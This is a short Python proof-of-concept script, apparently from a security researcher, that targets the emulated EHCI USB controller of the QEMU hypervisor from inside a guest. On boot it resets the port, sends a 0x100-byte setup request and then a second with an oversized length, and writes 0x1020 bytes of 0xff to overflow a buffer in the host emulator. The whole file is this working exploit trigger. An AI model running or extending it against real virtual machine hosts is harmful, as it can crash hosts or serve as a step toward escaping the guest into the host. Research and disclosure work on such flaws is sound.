#    SPDX-FileCopyrightText: 2021 Daniel Fernandez Kuehr <daniel.kuehr@tacitosecurity.com>
#    SPDX-License-Identifier: GPL-3.0-or-later

import ehci
from qemu_guest import Guest
from remotemem import IOVector, Chunk

class Trigger(ehci.Session):
    retry_exceptions = False
    timeout = 0

    def trigger_overflow(self, overflow_len, data):
        self.setup(self.request(0, 0, 0, 0, 0x100))
        self.setup(self.request(0, 0, 0, 0, overflow_len))
        self.usb_out(IOVector([Chunk(data)]))

    def on_boot(self, body):
        super().on_boot(body)  
        self.port_reset()
        self.trigger_overflow(0x1020, b'\xff' * 0x1020)

if __name__ == "__main__":
    Trigger(Guest).run()
